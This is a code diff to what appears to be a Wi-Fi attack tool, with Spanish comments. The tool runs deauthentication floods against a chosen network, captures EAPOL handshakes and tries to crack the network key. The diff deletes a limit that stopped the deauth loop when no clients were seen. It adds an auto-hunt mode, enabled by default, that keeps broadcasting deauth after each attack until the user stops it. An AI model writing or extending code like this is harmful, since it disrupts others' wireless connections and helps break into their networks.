@@ -994,15 +994,13 @@ async function hunterCycle() {
       window._hunterNoClientCycles = (window._hunterNoClientCycles || 0) + 1;
       if (window._hunterNoClientCycles >= MAX_NO_CLIENT_CYCLES) {
         // Objetivo concluido: demasiados cycles sin STAs detectados.
-        // Detener caza y pasar al siguiente objetivo (si está en modo masivo)
-        // o informar al usuario.
+        // Auto-caza (decisión usuario 2026-11-27): NO detenerse. Seguir
+        // intentando desautenticar en bucle hasta capturar EAPOL o «Detener».
+        // El límite solo se usa para informar, no para parar la caza.
         log('[cazador] ' + ((cs && cs.message) || 'sin clientes reales') +
-            ' — ' + MAX_NO_CLIENT_CYCLES + ' cycles seguidos sin STAs. ' +
-            'Objetivo concluido sin material EAPOL.', 'warn');
-        // No establecer broadcast = true para evitar emitir deauth infinito;
-        // el ciclo actual sí lo emitirá (el contador ya alcanzó el límite).
-        window._hunterStopRequested = true; // evitar que hunterCycle re-agende
-        broadcast = false; // valor any, el log de abajo lo manejará
+            ' — ' + window._hunterNoClientCycles + ' cycles seguidos sin STAs. ' +
+            'Auto-caza: SIGUE intentando deauth (solo para con «Detener»).', 'warn');
+        broadcast = true; // seguir con broadcast aunque no haya STAs detectadas
       } else {
         broadcast = true;
       }
@@ -1577,11 +1575,13 @@ window.iaAttack = async function () {
     if (pct != null) updateProgress(pct, t || '');
     if (t) log(`[etapa] ${t}`, 'info');
   };
+  // Declaradas FUERA del try: el finally (auto-caza) necesita bssid/ssid/ch.
+  let bssid = ($('attack-bssid')?.value || '').trim() || valOrEmpty($('ultra-bssid')?.value) || '';
+  let ssid = valOrEmpty($('ultra-ssid')?.value);
+  let ch;
   try {
-    let bssid = ($('attack-bssid')?.value || '').trim() || valOrEmpty($('ultra-bssid')?.value) || '';
-    let ssid = valOrEmpty($('ultra-ssid')?.value);
     let n = lastNets.find(x => (x.bssid || '').toUpperCase() === bssid.toUpperCase()) || {};
-    let ch = parseInt(n.channel) || selectedChannel() || undefined;
+    ch = parseInt(n.channel) || selectedChannel() || undefined;
     const material = [ $('ultra-hash')?.value, $('crack-hash')?.value, $('convert-native-pcap')?.value ]
       .map(v => valOrEmpty(v)).filter(Boolean).join(', ');
     if (!bssid && !material) {
@@ -1839,7 +1839,11 @@ window.iaAttack = async function () {
     setAttackRunning(false);
     showProgress(false);
     await restoreRadioAfterAttack();
-    resumeHunterIfPaused();
+    // Auto-caza EAPOL también en Modo IA: sigue desautenticando en bucle.
+    if (!window._simpleStop) {
+      const startedIA = window.maybeStartAutoHunt(bssid, ssid, ch);
+      if (startedIA) log('[auto-caza] Modo IA → cazador en bucle sigue deauth + watcher EAPOL.', 'ok');
+    } else resumeHunterIfPaused();
     log('Modo IA finalizado.', 'warn');
   }
 };
@@ -3010,6 +3014,26 @@ function waitForAttack(id, timeoutMs) {
   });
 }
 
+// ── Auto-caza EAPOL (opción del usuario 2026-11-27) ──────────────────────
+// Checkbox #auto-hunt-toggle (marcado por defecto). Al lanzar cualquier ataque,
+// el cazador queda EN BUCLE siguiendo atacando y buscando EAPOLs hasta capturar.
+// Solo se para con «Detener» (o al capturar material real). Respeta M-09: NO se
+// reactiva al abrir la app, solo tras un ataque iniciado por el usuario.
+window._autoHunt = true;
+window.setAutoHunt = function (on) {
+  window._autoHunt = !!on;
+  const t = $('auto-hunt-toggle'); if (t) t.checked = window._autoHunt;
+  log(window._autoHunt
+    ? 'Auto-caza EAPOL ACTIVADA: tras atacar, el cazador seguirá en bucle buscando EAPOL.'
+    : 'Auto-caza EAPOL desactivada: el cazador no se reanudará tras el ataque.', 'warn');
+};
+window.maybeStartAutoHunt = function (bssid, ssid, channel) {
+  if (!window._autoHunt || !bssid) return false;
+  if (window._hunterActive) return false; // ya está cazando: no reiniciar
+  try { startHunter(bssid, ssid || '', channel || 0); return true; }
+  catch (e) { log('[auto-caza] no se pudo iniciar: ' + e, 'warn'); return false; }
+};
+
 // ── Ataque simple (UI: logs + Atacar/Detener) ───────────────────────────
 window.simpleAttack = async function () {
   // NOTA: aquí había `if (!activeNet && ...)` con `activeNet` SIN DECLARAR en
@@ -3320,7 +3344,12 @@ const r = await window.__invoke('crack_plan_run_bg', { hashFile, ssid: ssid || '
     showProgress(false);
     updateProgress(cracked ? 100 : 0, cracked ? 'Clave encontrada' : (stopped ? 'Detenido' : 'Fin'));
     await restoreRadioAfterAttack();
-    resumeHunterIfPaused();
+    // Auto-caza EAPOL: tras el ataque (si no se capturó clave), sigue en bucle
+    // DESAUTENTICANDO y buscando EAPOL hasta que el usuario pulse Detener.
+    if (!cracked && !stopped) {
+      const started = window.maybeStartAutoHunt(bssid, ssid, ch);
+      if (started) log('[auto-caza] cazador en bucle: sigue intentando deauth + watcher EAPOL.', 'ok');
+    } else resumeHunterIfPaused();
     log(cracked ? '✅ Ataque finalizado: clave encontrada (ver logs/.cracked).' : (stopped ? '⏹ Ataque detenido.' : 'Ataque finalizado. Revisa los logs: captura/hash/candidatas determinan el resultado.'), cracked ? 'ok' : 'warn');
   }
 };
